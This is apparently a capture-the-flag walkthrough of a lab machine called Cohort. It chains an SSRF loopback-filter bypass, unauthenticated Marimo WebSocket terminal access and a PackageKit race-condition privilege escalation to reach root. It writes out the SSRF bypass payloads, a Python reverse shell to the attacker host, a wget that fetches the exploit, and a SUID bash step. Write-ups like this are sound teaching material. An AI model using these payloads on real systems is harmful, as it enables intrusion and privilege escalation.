# Cohort

## Enumeration
## Nmap Scan
Performed a full TCP port scan with service and version detection.

nmap -sVC -T4 -p- <target_ip>

### Results

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)

ssl-cert:
CN = cohort.htb
SAN = cohort.htb, *.cohort.htb
```

### Findings

*   SSH service available
*   HTTP and HTTPS served by nginx
*   Wildcard SSL certificate indicates additional virtual hosts may exist

* * *

## Configure Local DNS

Add the hostname to `/etc/hosts`.

echo "<target_ip> cohort.htb" | sudo tee -a /etc/hosts

This allows:

*   Proper hostname resolution
*   Valid HTTPS certificate matching

* * *

## Web Enumeration
## Directory Enumeration

Initial directory brute-force:

gobuster dir \
-u https://cohort.htb \
-w /usr/share/wordlists/dirb/common.txt \
-k

### Observation

The application behaves as a **Single Page Application (SPA)**.

Every unknown path returns the same page, so directory brute-force is a dead end. Analysis of `app.js` reveals an API endpoint: `POST /api/validate`.

* * *

## SSRF
## The Validate Endpoint

The endpoint accepts a JSON body containing a `url` and fetches it server-side:

curl -k -X POST https://cohort.htb/api/validate \
-H "Content-Type: application/json" \
-d '{"url":"http://127.0.0.1"}'

### Filter

The server blocks direct loopback requests:

{
  "ok": false,
  "message": "Blocked address."
}

### Bypass

Alternate loopback representations bypass the filter:

{
"url":"http://127.1"
}

Response:

{
  "ok": true,
  "fetched_status": 200,
  "message": "Source reachable."
}

### URL Encoding

{
"url":"http://127%2E0%2E0%2E1"
}

Response:

{
  "ok": true,
  "fetched_status": 200,
  "message": "Source reachable."
}

The SSRF protection was successfully bypassed.

* * *

## Internal Service Discovery

Using SSRF, request the protected endpoint.

curl -k -X POST https://cohort.htb/api/validate \
-H "Content-Type: application/json" \
-d '{"url":"http://0.0.0.0/status"}'

Response:

{
  "upstreams": [
    {
      "host": "cohort.htb"
    },
    {
      "target": "127.0.0.1:5000"
    },
    {
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888"
    }
  ]
}

An internal virtual host was disclosed:

```
nb-1be3782a8afd3ad5.cohort.htb
```

Add it locally.

echo "<target_ip> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts

* * *

## Initial Access
## Identify the Notebook Service

The leaked virtual host exposed a **Marimo Notebook** instance (v0.20.4).

A vulnerable version exposed:

```
/terminal/ws
```

The service was affected by **CVE-2026-39987**, allowing unauthenticated WebSocket terminal access.

* * *

## Connect to the WebSocket Terminal

websocat -k \
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws

Result:

```
Shell as user: marimo
```

* * *

## Obtain a Stable Reverse Shell
### Start a Listener

nc -lvnp 4444

### Execute Reverse Shell

python3 -c "import pty,socket,os;
s=socket.socket();
s.connect(('<attack_ip>',4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn('/bin/bash')"

### Stabilize the Shell

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

Ctrl + Z

stty raw -echo

fg

* * *

## User Flag

cat /home/marimo/user.txt

```
<user_flag>
```

* * *

## Privilege Escalation
## Enumerate PackageKit

dpkg -l | grep packagekit

Output:

```
hi packagekit 1.2.8-2ubuntu1.2
```

The package was intentionally pinned to a vulnerable version.

Associated vulnerability:

**CVE-2026-41651**

A PackageKit TOCTOU race condition leading to privilege escalation.

* * *

## Transfer the Exploit
### Attacker Machine

python3 -m http.server 8080

### Target Machine

wget http://<attack_ip>:8080/exploit \
-O /tmp/exploit

chmod +x /tmp/exploit

* * *

## Execute the Exploit

/tmp/exploit

Expected output:

```
SUCCESS — SUID bash created
```

A subsequent authentication error (`PK error 48`) is expected because the race condition succeeds before authorization completes.

* * *

## Root Access

Execute the generated SUID bash.

/tmp/.suid_bash -p

Verify privileges.

whoami

Output:

```
root
```

Retrieve the root flag.

cat /root/root.txt

```
<root_flag>
```

* * *

## Attack Chain

```
Nmap
 │
 ▼
Web Enumeration
 │
 ▼
POST /api/validate
 │
 ▼
SSRF
 │
 ▼
Loopback Filter Bypass
 │
 ▼
Access Internal /status
 │
 ▼
Leak Internal Notebook Virtual Host
 │
 ▼
Marimo WebSocket Terminal
 │
 ▼
Shell as marimo
 │
 ▼
PackageKit Enumeration
 │
 ▼
CVE-2026-41651
 │
 ▼
SUID Bash
 │
 ▼
Root
```

* * *

## Summary

| Stage | Technique |
| --- | --- |
| Reconnaissance | Nmap Service Enumeration |
| Web Enumeration | Gobuster + app.js Analysis |
| Initial Vulnerability | SSRF |
| SSRF Bypass | Alternate Loopback Address |
| Information Disclosure | Internal Nginx Upstream Leak |
| Initial Access | Marimo WebSocket Terminal (CVE-2026-39987) |
| Privilege Escalation | PackageKit TOCTOU Race (CVE-2026-41651) |
| Final Impact | Root Shell |
